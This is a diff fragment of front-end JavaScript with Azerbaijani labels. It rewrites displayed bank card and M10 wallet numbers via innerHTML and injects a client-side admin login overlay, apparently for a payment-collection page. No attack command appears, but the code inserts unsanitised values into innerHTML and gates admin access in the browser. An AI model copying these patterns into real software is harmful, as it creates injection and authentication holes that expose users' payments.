+        if(b1Name && b1Card) cards[0].innerHTML = `<small style="color: #777;">${b1Name}</small><br><b style="letter-spacing: 1px;">${b1Card}</b>`;
+        if(b2Name && b2Card) cards[1].innerHTML = `<small style="color: #777;">${b2Name}</small><br><b style="letter-spacing: 1px;">${b2Card}</b>`;
+        if(m10Num) cards[2].innerHTML = `<small style="color: #777;">M10 Nömrə</small><br><b>${m10Num}</b>`;
+        
+        alert("Bank və Kart məlumatları uğurla dəyişdirildi!");
+    }
+
+    // 4. ADMİN LOGİN EKRANI (ƏGƏR YOXDURSA YARADIR)
+    if (!document.getElementById('admin-login')) {
+        const loginHTML = `
+        <div id="admin-login" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:100000; padding:20px; box-sizing:border-box;">
+            <div class="container" style="margin-top:100px; background:#111; padding:20px; border-radius:15px; border:1px solid #333;">
+                <h2 style="text-align:center; color:#ff0050;">🔐 Giriş</h2>
+                <input type="text" id="adminUser" placeholder="İstifadəçi" style="width:100%; padding:12px; margin:10px 0; background:#000; border:1px solid #444; color:white; border-radius:8px;">
+                <input type="password" id="adminPass" placeholder="Şifrə" style="width:100%; padding:12px; margin:10px 0; background:#000; border:1px solid #444; color:white; border-radius:8px;">
+                <button onclick="checkAdmin()" style="width:100%; padding:15px; background:linear-gradient(90deg, #ff0050, #00f2ea); border:none; color:white; font-weight:bold; border-radius:8px; cursor:pointer;">DAXİL OL</button>
+                <button onclick="document.getElementById('admin-login').style.display='none'" style="width:100%; margin-top:10px; background:transparent; color:#666; border:none; cursor:pointer;">Ləğv et</button>
+            </div>
+        </div>`;
+        document.body.insertAdjacentHTML('beforeend', loginHTML);
+    }
+</script>
